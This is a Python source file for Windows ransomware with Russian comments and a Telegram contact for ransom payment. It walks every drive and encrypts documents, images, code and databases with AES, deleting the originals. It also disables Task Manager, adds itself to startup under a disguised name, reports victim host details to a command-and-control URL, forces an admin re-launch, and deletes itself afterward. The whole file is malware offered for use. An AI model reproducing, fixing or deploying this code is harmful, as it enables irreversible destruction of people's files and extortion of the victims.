import os
import sys
import socket
import platform
import threading
import base64
import hashlib
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Protocol.KDF import PBKDF2
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
import win32api
import win32con
import win32gui
import ctypes
from ctypes import wintypes
import time
import requests
import json
from uuid import getnode as get_mac

# Конфигурация
EXTENSIONS = ['.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', 
              '.jpg', '.jpeg', '.png', '.bmp', '.sql', '.mdb', '.dbf', '.psd', 
              '.ai', '.cdr', '.dwg', '.mp3', '.wav', '.mp4', '.avi', '.mkv', 
              '.zip', '.rar', '.7z', '.cpp', '.py', '.java', '.html', '.php', 
              '.js', '.css', '.config', '.ini', '.dat', '.bak']

C2_SERVER = "http://example.com/c2"  # Замените на реальный C2 сервер
RANSOM_NOTE = """
ВАШИ ФАЙЛЫ ЗАШИФРОВАНЫ!

Чтобы восстановить файлы, отправьте сообщение в телеграме @M_I_N_E_T_I
"""

# Глобальные переменные
victim_id = None
encryption_key = None

class ComplexRansomware:
    def __init__(self):
        self.victim_id = self.generate_victim_id()
        self.encryption_key = self.generate_encryption_key()
        self.ransom_amount = round(0.1 + (hash(self.victim_id) % 100) / 100, 2)  # Динамическая сумма выкупа
        
    def generate_victim_id(self):
        """Генерация уникального ID жертвы"""
        mac = get_mac()
        hostname = socket.gethostname()
        username = os.getlogin()
        system_info = platform.platform()
        
        data = f"{mac}-{hostname}-{username}-{system_info}"
        return hashlib.sha256(data.encode()).hexdigest()[:16].upper()
    
    def generate_encryption_key(self):
        """Генерация криптостойкого ключа с использованием PBKDF2"""
        salt = get_random_bytes(16)
        password = get_random_bytes(32)
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA512(),
            length=32,
            salt=salt,
            iterations=100000,
            backend=default_backend()
        )
        return base64.urlsafe_b64encode(kdf.derive(password))
    
    def encrypt_file(self, file_path):
        """Шифрование файла с использованием AES-256 в режиме GCM"""
        try:
            # Генерация случайного IV
            iv = get_random_bytes(16)
            
            # Создание шифра
            cipher = AES.new(self.encryption_key, AES.MODE_GCM, iv)
            
            # Чтение и шифрование файла
            with open(file_path, 'rb') as f:
                plaintext = f.read()
            
            ciphertext, tag = cipher.encrypt_and_digest(plaintext)
            
            # Запись зашифрованных данных
            with open(file_path + '.locked', 'wb') as f:
                [f.write(x) for x in (iv, tag, ciphertext)]
            
            # Удаление оригинального файла
            os.remove(file_path)
            return True
        except Exception as e:
            print(f"Error encrypting {file_path}: {e}")
            return False
    
    def encrypt_files(self, start_path):
        """Рекурсивное шифрование файлов"""
        for root, dirs, files in os.walk(start_path):
            for file in files:
                file_path = os.path.join(root, file)
                if any(file_path.lower().endswith(ext) for ext in EXTENSIONS):
                    if self.encrypt_file(file_path):
                        print(f"Encrypted: {file_path}")
    
    def change_wallpaper(self):
        """Изменение обоев рабочего стола с сообщением о выкупе"""
        try:
            # Создание изображения с сообщением
            from PIL import Image, ImageDraw, ImageFont
            img = Image.new('RGB', (1920, 1080), color='black')
            d = ImageDraw.Draw(img)
            
            try:
                font = ImageFont.truetype("arial.ttf", 40)
            except:
                font = ImageFont.load_default()
            
            text = RANSOM_NOTE.format(self.ransom_amount, self.victim_id)
            d.text((100, 100), text, fill='red', font=font)
            
            temp_path = os.path.join(os.environ['TEMP'], 'wallpaper.png')
            img.save(temp_path)
            
            # Установка обоев
            SPI_SETDESKWALLPAPER = 0x0014
            ctypes.windll.user32.SystemParametersInfoW(
                SPI_SETDESKWALLPAPER, 0, temp_path, 3)
        except Exception as e:
            print(f"Error changing wallpaper: {e}")
    
    def disable_task_manager(self):
        """Отключение диспетчера задач"""
        try:
            key = win32api.RegOpenKeyEx(
                win32con.HKEY_CURRENT_USER,
                "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                0, win32con.KEY_SET_VALUE)
            win32api.RegSetValueEx(key, "DisableTaskMgr", 0, win32con.REG_DWORD, 1)
            win32api.RegCloseKey(key)
        except Exception as e:
            print(f"Error disabling task manager: {e}")
    
    def add_to_startup(self):
        """Добавление в автозагрузку"""
        try:
            path = os.path.abspath(sys.argv[0])
            key = win32api.RegOpenKeyEx(
                win32con.HKEY_CURRENT_USER,
                "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                0, win32con.KEY_SET_VALUE)
            win32api.RegSetValueEx(key, "SystemUpdate", 0, win32con.REG_SZ, path)
            win32api.RegCloseKey(key)
        except Exception as e:
            print(f"Error adding to startup: {e}")
    
    def connect_to_c2(self):
        """Соединение с C2 сервером"""
        try:
            data = {
                'victim_id': self.victim_id,
                'hostname': socket.gethostname(),
                'username': os.getlogin(),
                'os': platform.platform(),
                'timestamp': time.time(),
                'ransom_amount': self.ransom_amount
            }
            
            response = requests.post(
                C2_SERVER,
                data=json.dumps(data),
                headers={'Content-Type': 'application/json'},
                timeout=10
            )
            
            if response.status_code == 200:
                print("Successfully connected to C2")
        except Exception as e:
            print(f"Error connecting to C2: {e}")
    
    def show_ransom_note(self):
        """Отображение окна с требованием выкупа"""
        try:
            message = RANSOM_NOTE.format(self.ransom_amount, self.victim_id)
            ctypes.windll.user32.MessageBoxW(
                0, message, "ВАШИ ФАЙЛЫ ЗАШИФРОВАНЫ!", 0x10)
        except Exception as e:
            print(f"Error showing ransom note: {e}")
    
    def run(self):
        """Основной метод выполнения"""
        try:
            # Шифрование файлов в нескольких потоках
            drives = self.get_drives()
            threads = []
            
            for drive in drives:
                t = threading.Thread(target=self.encrypt_files, args=(drive,))
                threads.append(t)
                t.start()
            
            for t in threads:
                t.join()
            
            # Дополнительные вредоносные действия
            self.change_wallpaper()
            self.disable_task_manager()
            self.add_to_startup()
            self.connect_to_c2()
            self.show_ransom_note()
            
            # Самоуничтожение
            self.self_destruct()
        except Exception as e:
            print(f"Error in main execution: {e}")
    
    def get_drives(self):
        """Получение списка дисков"""
        drives = []
        bitmask = ctypes.windll.kernel32.GetLogicalDrives()
        
        for letter in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
            if bitmask & 1:
                drives.append(f"{letter}:\\")
            bitmask >>= 1
        
        return drives
    
    def self_destruct(self):
        """Самоуничтожение программы"""
        try:
            bat_path = os.path.join(os.environ['TEMP'], 'selfdestruct.bat')
            with open(bat_path, 'w') as f:
                f.write(f"@echo off\n")
                f.write(f"timeout /t 3 /nobreak >nul\n")
                f.write(f"del /f /q \"{os.path.abspath(sys.argv[0])}\"\n")
                f.write(f"del /f /q \"{bat_path}\"\n")
            
            os.system(f'start /min cmd /c "{bat_path}"')
            sys.exit(0)
        except Exception as e:
            print(f"Error in self-destruct: {e}")
            sys.exit(1)

if __name__ == "__main__":
    # Проверка, что это Windows
    if platform.system() != 'Windows':
        print("This malware works only on Windows")
        sys.exit(1)
    
    # Проверка прав администратора
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        is_admin = False
    
    if not is_admin:
        # Попытка перезапуска с правами администратора
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit(0)
    
    # Запуск винлокера
    ransomware = ComplexRansomware()
    ransomware.run()